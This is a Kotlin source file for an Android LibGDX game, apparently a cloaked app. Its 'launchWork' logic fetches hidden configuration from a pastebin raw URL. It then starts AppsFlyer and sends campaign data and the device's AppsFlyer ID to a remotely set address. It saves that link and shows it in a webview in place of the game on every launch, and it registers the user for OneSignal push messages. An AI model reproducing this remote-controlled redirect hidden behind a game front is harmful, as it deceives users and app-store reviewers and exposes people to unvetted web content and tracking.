package com.progressmas.samsuster.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.onesignal.OneSignal
import com.progressmas.samsuster.GameActivity
import com.progressmas.samsuster.appContext
import com.progressmas.samsuster.game.dataStore.DataStore
import com.progressmas.samsuster.game.manager.MusicManager
import com.progressmas.samsuster.game.manager.NavigationManager
import com.progressmas.samsuster.game.manager.SoundManager
import com.progressmas.samsuster.game.manager.SpriteManager
import com.progressmas.samsuster.game.manager.util.MusicUtil
import com.progressmas.samsuster.game.manager.util.SoundUtil
import com.progressmas.samsuster.game.manager.util.SpriteUtil
import com.progressmas.samsuster.game.screens.AbstractWorkScreen
import com.progressmas.samsuster.game.screens.LoaderScreen
import com.progressmas.samsuster.game.utils.GColor
import com.progressmas.samsuster.game.utils.advanced.AdvancedGame
import com.progressmas.samsuster.game.utils.disposeAll
import com.progressmas.samsuster.game.worker.WorkerInvestUtil
import com.progressmas.samsuster.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Loader() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.green
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    var isGame = false

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        collectWorkerInvest()
        launchWork()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("GAME_DATA", MODE_PRIVATE)

    val dataStore        = DataStore(sharedPreferences)
    val workerInvestUtil = WorkerInvestUtil()

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic ------------------------------------------------------------------

    private fun collectWorkerInvest() {
        coroutine.launch(Dispatchers.IO) {
            workerInvestUtil.collectWorkerInvest { screenTypeIndex, investmentIndex, investment ->
                screen?.let {
                    if (it is AbstractWorkScreen) {
                        it.showDialogInvest(screenTypeIndex, investmentIndex, investment)
                    } else {
                        AbstractWorkScreen.LIST_RESERVE_INVEST.add(
                            AbstractWorkScreen.ReserveInvest(screenTypeIndex, investmentIndex, investment)
                        )
                    }
                }
            }
        }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun launchWork() {
        log("launchWork")
        activity.blockRedirect = { isGame = true }
        activity.initWeb()

        val myWork = sharedPreferences.getString("work", "weekend") ?: "weekend"

        try {
            if (myWork == "weekend") {
                coroutine.launch(Dispatchers.Main) {
                    val JSON = withContext(Dispatchers.IO) { requestGet() }

                    if (JSON != null) {
                        AppsFlyerLib.getInstance().init(JSON.inch, getAppsFlyerConversionListener(JSON.progress + JSON.master, JSON.oneKey), appContext)
                        AppsFlyerLib.getInstance().start(activity, JSON.inch, getAppsFlyerRequestListener())
                    } else {
                        isGame = true
                    }
                }
            } else {
                activity.showUrl(myWork)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<GetJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/ncjZM1sV"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = GetJSON(
                    progress = jsonResponse.getString("progress") ?: "",
                    master   = jsonResponse.getString("master")   ?: "",
                    inch     = jsonResponse.getString("inch")     ?: "",
                    oneKey   = jsonResponse.getString("oneKey")   ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class GetJSON(val progress: String, val master: String, val inch: String, val oneKey: String)

    private fun getAppsFlyerConversionListener(all: String, oneKey: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$all?progmac=$campaign&plb=$afAd&progmamed=$media&progmafd=$afId"
                log("link = $link")

                // OneSignal
                if (campaign != null) {
                    coroutine.launch(Dispatchers.Main) {
                        OneSignal.initWithContext(activity, oneKey)
                        OneSignal.login(campaign)
                        withContext(Dispatchers.IO) { OneSignal.Notifications.requestPermission(false) }
                    }
                }

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("work", link).apply() }
                activity.showUrl(link)

            } else isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}